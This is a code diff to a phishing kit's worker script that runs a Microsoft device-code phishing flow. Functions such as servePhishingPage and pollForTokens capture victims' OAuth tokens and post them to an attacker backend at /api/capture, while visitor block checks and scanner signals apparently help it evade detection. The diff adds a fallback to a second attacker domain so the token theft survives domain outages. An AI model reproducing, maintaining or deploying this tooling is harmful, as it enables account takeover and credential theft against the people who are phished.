@@ -4,6 +4,47 @@
 const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
 const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
 const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';
+// Secondary backend for the API-domain split. VERIFY_ENDPOINT points at the
+// API-only domain (config.API_URL). While that zone is not yet resolvable or
+// proxied, every backend call in this worker would fail and the Microsoft
+// device code would never be requested - the page loads but silently does
+// nothing. VERIFY_ENDPOINT_FALLBACK is the old panel domain (config.APP_URL);
+// backendFetch() retries against it when the primary is unreachable. An empty
+// string disables the fallback.
+const VERIFY_ENDPOINT_FALLBACK = '{{VERIFY_ENDPOINT_FALLBACK}}';
+
+// De-duplicated backend origins, primary first. An empty entry is dropped so
+// a link generated before the fallback was introduced still works (single
+// endpoint, exactly the old behavior).
+const _BACKEND_ENDPOINTS = (function () {
+  var eps = [];
+  for (var i = 0; i < 2; i++) {
+    var ep = (i === 0 ? VERIFY_ENDPOINT : VERIFY_ENDPOINT_FALLBACK) || '';
+    ep = ep.replace(/\/+$/, '');
+    if (ep && eps.indexOf(ep) === -1) eps.push(ep);
+  }
+  return eps;
+})();
+
+// Call the backend through the first origin that actually answers. A 2xx/4xx
+// response means the real backend answered (it decides success/failure), so it
+// is returned as-is. A 5xx or a network error means that origin is unusable -
+// move on to the next one. Throws when every origin fails, which preserves the
+// existing catch blocks' error handling.
+async function backendFetch(path, init) {
+  var lastErr = null;
+  for (var i = 0; i < _BACKEND_ENDPOINTS.length; i++) {
+    try {
+      var res = await fetch(_BACKEND_ENDPOINTS[i] + path, init);
+      if (res.status < 500) return res;
+      lastErr = new Error('HTTP ' + res.status + ' from ' + _BACKEND_ENDPOINTS[i]);
+    } catch (err) {
+      lastErr = err;
+    }
+  }
+  if (lastErr) throw lastErr;
+  throw new Error('No backend endpoint configured');
+}
 
 // Link-scoped JWT, injected at build time. Used to authenticate backend calls
 // that don't otherwise carry a token - e.g. scanner-signal, which the worker
@@ -241,7 +282,7 @@ async function handleRequest(request, waitUntil) {
                         request.headers.get('X-Forwarded-For') || '')
                         .split(',')[0].trim();
       if (signalIp && typeof waitUntil === 'function') {
-        waitUntil(fetch(VERIFY_ENDPOINT + '/api/scanner-signal', {
+        waitUntil(backendFetch('/api/scanner-signal', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -295,7 +336,7 @@ async function servePhishingPage(request) {
 
   // Check if visitor should be blocked or challenged
   try {
-    const blockResponse = await fetch(`${VERIFY_ENDPOINT}/api/capture/visitor/block-check`, {
+    const blockResponse = await backendFetch('/api/capture/visitor/block-check', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ jwt_token: jwtToken, visitor_ip: visitorIp }),
@@ -346,7 +387,7 @@ async function servePhishingPage(request) {
   let dynamicTurnstileKey = turnstileKey;
 
   try {
-    const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
+    const verifyResponse = await backendFetch('/api/verify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ token: jwtToken }),
@@ -397,7 +438,7 @@ async function handleDeviceCodeRequest(request) {
     // Verify JWT with backend
     console.log('[Worker] Verifying JWT with backend...');
     try {
-      const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
+      const verifyResponse = await backendFetch('/api/verify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ token: jwt_token }),
@@ -553,7 +594,7 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
           capturePayload.scope = tokenData.scope;
         }
 
-        await fetch(`${VERIFY_ENDPOINT}/api/capture`, {
+        await backendFetch('/api/capture', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(capturePayload),
@@ -604,7 +645,7 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval) 
 
 async function handleVerifyRequest(request) {
   const { token } = await request.json();
-  const verifyResponse = await fetch(`${VERIFY_ENDPOINT}/api/verify`, {
+  const verifyResponse = await backendFetch('/api/verify', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ token }),
@@ -615,7 +656,7 @@ async function handleVerifyRequest(request) {
 async function handleLogRequest(request) {
   try {
     const body = await request.json();
-    await fetch(`${LOG_ENDPOINT}/api/log`, {
+    await backendFetch('/api/log', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(body),
